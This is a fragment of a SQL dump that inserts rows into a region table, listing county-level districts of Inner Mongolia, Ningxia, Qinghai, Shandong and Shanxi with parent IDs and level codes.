INSERT INTO `ec22703249_region` VALUES ('2162', '258', '回民区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2163', '258', '玉泉区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2164', '258', '新城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2165', '258', '赛罕区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2166', '258', '清水河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2167', '258', '土默特左旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2168', '258', '托克托县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2169', '258', '和林格尔县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2170', '258', '武川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2171', '259', '阿拉善左旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2172', '259', '阿拉善右旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2173', '259', '额济纳旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2174', '260', '临河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2175', '260', '五原县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2176', '260', '磴口县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2177', '260', '乌拉特前旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2178', '260', '乌拉特中旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2179', '260', '乌拉特后旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2180', '260', '杭锦后旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2181', '261', '昆都仑区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2182', '261', '青山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2183', '261', '东河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2184', '261', '九原区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2185', '261', '石拐区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2186', '261', '白云矿区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2187', '261', '土默特右旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2188', '261', '固阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2189', '261', '达尔罕茂明安联合旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2190', '262', '红山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2191', '262', '元宝山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2192', '262', '松山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2193', '262', '阿鲁科尔沁旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2194', '262', '巴林左旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2195', '262', '巴林右旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2196', '262', '林西县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2197', '262', '克什克腾旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2198', '262', '翁牛特旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2199', '262', '喀喇沁旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2200', '262', '宁城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2201', '262', '敖汉旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2202', '263', '东胜区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2203', '263', '达拉特旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2204', '263', '准格尔旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2205', '263', '鄂托克前旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2206', '263', '鄂托克旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2207', '263', '杭锦旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2208', '263', '乌审旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2209', '263', '伊金霍洛旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2210', '264', '海拉尔区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2211', '264', '莫力达瓦', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2212', '264', '满洲里市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2213', '264', '牙克石市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2214', '264', '扎兰屯市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2215', '264', '额尔古纳市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2216', '264', '根河市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2217', '264', '阿荣旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2218', '264', '鄂伦春自治旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2219', '264', '鄂温克族自治旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2220', '264', '陈巴尔虎旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2221', '264', '新巴尔虎左旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2222', '264', '新巴尔虎右旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2223', '265', '科尔沁区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2224', '265', '霍林郭勒市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2225', '265', '科尔沁左翼中旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2226', '265', '科尔沁左翼后旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2227', '265', '开鲁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2228', '265', '库伦旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2229', '265', '奈曼旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2230', '265', '扎鲁特旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2231', '266', '海勃湾区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2232', '266', '乌达区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2233', '266', '海南区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2234', '267', '化德县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2235', '267', '集宁区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2236', '267', '丰镇市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2237', '267', '卓资县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2238', '267', '商都县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2239', '267', '兴和县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2240', '267', '凉城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2241', '267', '察哈尔右翼前旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2242', '267', '察哈尔右翼中旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2243', '267', '察哈尔右翼后旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2244', '267', '四子王旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2245', '268', '二连浩特市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2246', '268', '锡林浩特市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2247', '268', '阿巴嘎旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2248', '268', '苏尼特左旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2249', '268', '苏尼特右旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2250', '268', '东乌珠穆沁旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2251', '268', '西乌珠穆沁旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2252', '268', '太仆寺旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2253', '268', '镶黄旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2254', '268', '正镶白旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2255', '268', '正蓝旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2256', '268', '多伦县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2257', '269', '乌兰浩特市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2258', '269', '阿尔山市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2259', '269', '科尔沁右翼前旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2260', '269', '科尔沁右翼中旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2261', '269', '扎赉特旗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2262', '269', '突泉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2263', '270', '西夏区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2264', '270', '金凤区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2265', '270', '兴庆区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2266', '270', '灵武市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2267', '270', '永宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2268', '270', '贺兰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2269', '271', '原州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2270', '271', '海原县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2271', '271', '西吉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2272', '271', '隆德县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2273', '271', '泾源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2274', '271', '彭阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2275', '272', '惠农县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2276', '272', '大武口区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2277', '272', '惠农区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2278', '272', '陶乐县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2279', '272', '平罗县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2280', '273', '利通区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2281', '273', '中卫县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2282', '273', '青铜峡市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2283', '273', '中宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2284', '273', '盐池县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2285', '273', '同心县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2286', '274', '沙坡头区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2287', '274', '海原县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2288', '274', '中宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2289', '275', '城中区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2290', '275', '城东区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2291', '275', '城西区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2292', '275', '城北区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2293', '275', '湟中县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2294', '275', '湟源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2295', '275', '大通', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2296', '276', '玛沁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2297', '276', '班玛县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2298', '276', '甘德县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2299', '276', '达日县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2300', '276', '久治县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2301', '276', '玛多县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2302', '277', '海晏县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2303', '277', '祁连县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2304', '277', '刚察县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2305', '277', '门源', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2306', '278', '平安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2307', '278', '乐都县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2308', '278', '民和', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2309', '278', '互助', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2310', '278', '化隆', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2311', '278', '循化', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2312', '279', '共和县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2313', '279', '同德县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2314', '279', '贵德县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2315', '279', '兴海县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2316', '279', '贵南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2317', '280', '德令哈市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2318', '280', '格尔木市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2319', '280', '乌兰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2320', '280', '都兰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2321', '280', '天峻县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2322', '281', '同仁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2323', '281', '尖扎县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2324', '281', '泽库县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2325', '281', '河南蒙古族自治县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2326', '282', '玉树县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2327', '282', '杂多县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2328', '282', '称多县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2329', '282', '治多县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2330', '282', '囊谦县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2331', '282', '曲麻莱县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2332', '283', '市中区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2333', '283', '历下区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2334', '283', '天桥区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2335', '283', '槐荫区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2336', '283', '历城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2337', '283', '长清区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2338', '283', '章丘市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2339', '283', '平阴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2340', '283', '济阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2341', '283', '商河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2342', '284', '市南区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2343', '284', '市北区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2344', '284', '城阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2345', '284', '四方区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2346', '284', '李沧区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2347', '284', '黄岛区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2348', '284', '崂山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2349', '284', '胶州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2350', '284', '即墨市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2351', '284', '平度市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2352', '284', '胶南市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2353', '284', '莱西市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2354', '285', '滨城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2355', '285', '惠民县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2356', '285', '阳信县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2357', '285', '无棣县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2358', '285', '沾化县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2359', '285', '博兴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2360', '285', '邹平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2361', '286', '德城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2362', '286', '陵县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2363', '286', '乐陵市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2364', '286', '禹城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2365', '286', '宁津县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2366', '286', '庆云县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2367', '286', '临邑县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2368', '286', '齐河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2369', '286', '平原县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2370', '286', '夏津县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2371', '286', '武城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2372', '287', '东营区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2373', '287', '河口区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2374', '287', '垦利县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2375', '287', '利津县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2376', '287', '广饶县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2377', '288', '牡丹区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2378', '288', '曹县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2379', '288', '单县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2380', '288', '成武县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2381', '288', '巨野县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2382', '288', '郓城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2383', '288', '鄄城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2384', '288', '定陶县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2385', '288', '东明县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2386', '289', '市中区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2387', '289', '任城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2388', '289', '曲阜市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2389', '289', '兖州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2390', '289', '邹城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2391', '289', '微山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2392', '289', '鱼台县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2393', '289', '金乡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2394', '289', '嘉祥县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2395', '289', '汶上县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2396', '289', '泗水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2397', '289', '梁山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2398', '290', '莱城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2399', '290', '钢城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2400', '291', '东昌府区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2401', '291', '临清市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2402', '291', '阳谷县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2403', '291', '莘县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2404', '291', '茌平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2405', '291', '东阿县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2406', '291', '冠县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2407', '291', '高唐县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2408', '292', '兰山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2409', '292', '罗庄区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2410', '292', '河东区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2411', '292', '沂南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2412', '292', '郯城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2413', '292', '沂水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2414', '292', '苍山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2415', '292', '费县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2416', '292', '平邑县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2417', '292', '莒南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2418', '292', '蒙阴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2419', '292', '临沭县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2420', '293', '东港区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2421', '293', '岚山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2422', '293', '五莲县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2423', '293', '莒县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2424', '294', '泰山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2425', '294', '岱岳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2426', '294', '新泰市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2427', '294', '肥城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2428', '294', '宁阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2429', '294', '东平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2430', '295', '荣成市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2431', '295', '乳山市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2432', '295', '环翠区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2433', '295', '文登市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2434', '296', '潍城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2435', '296', '寒亭区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2436', '296', '坊子区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2437', '296', '奎文区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2438', '296', '青州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2439', '296', '诸城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2440', '296', '寿光市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2441', '296', '安丘市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2442', '296', '高密市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2443', '296', '昌邑市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2444', '296', '临朐县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2445', '296', '昌乐县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2446', '297', '芝罘区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2447', '297', '福山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2448', '297', '牟平区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2449', '297', '莱山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2450', '297', '开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2451', '297', '龙口市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2452', '297', '莱阳市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2453', '297', '莱州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2454', '297', '蓬莱市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2455', '297', '招远市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2456', '297', '栖霞市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2457', '297', '海阳市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2458', '297', '长岛县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2459', '298', '市中区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2460', '298', '山亭区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2461', '298', '峄城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2462', '298', '台儿庄区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2463', '298', '薛城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2464', '298', '滕州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2465', '299', '张店区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2466', '299', '临淄区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2467', '299', '淄川区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2468', '299', '博山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2469', '299', '周村区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2470', '299', '桓台县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2471', '299', '高青县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2472', '299', '沂源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2473', '300', '杏花岭区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2474', '300', '小店区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2475', '300', '迎泽区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2476', '300', '尖草坪区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2477', '300', '万柏林区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2478', '300', '晋源区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2479', '300', '高新开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2480', '300', '民营经济开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2481', '300', '经济技术开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2482', '300', '清徐县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2483', '300', '阳曲县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2484', '300', '娄烦县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2485', '300', '古交市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2486', '301', '城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2487', '301', '郊区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2488', '301', '沁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2489', '301', '潞城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2490', '301', '长治县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2491', '301', '襄垣县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2492', '301', '屯留县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2493', '301', '平顺县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2494', '301', '黎城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2495', '301', '壶关县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2496', '301', '长子县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2497', '301', '武乡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2498', '301', '沁源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2499', '302', '城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2500', '302', '矿区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2501', '302', '南郊区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2502', '302', '新荣区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2503', '302', '阳高县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2504', '302', '天镇县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2505', '302', '广灵县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2506', '302', '灵丘县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2507', '302', '浑源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2508', '302', '左云县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2509', '302', '大同县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2510', '303', '城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2511', '303', '高平市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2512', '303', '沁水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2513', '303', '阳城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2514', '303', '陵川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2515', '303', '泽州县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2516', '304', '榆次区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2517', '304', '介休市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2518', '304', '榆社县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2519', '304', '左权县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2520', '304', '和顺县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2521', '304', '昔阳县', '3', '0');
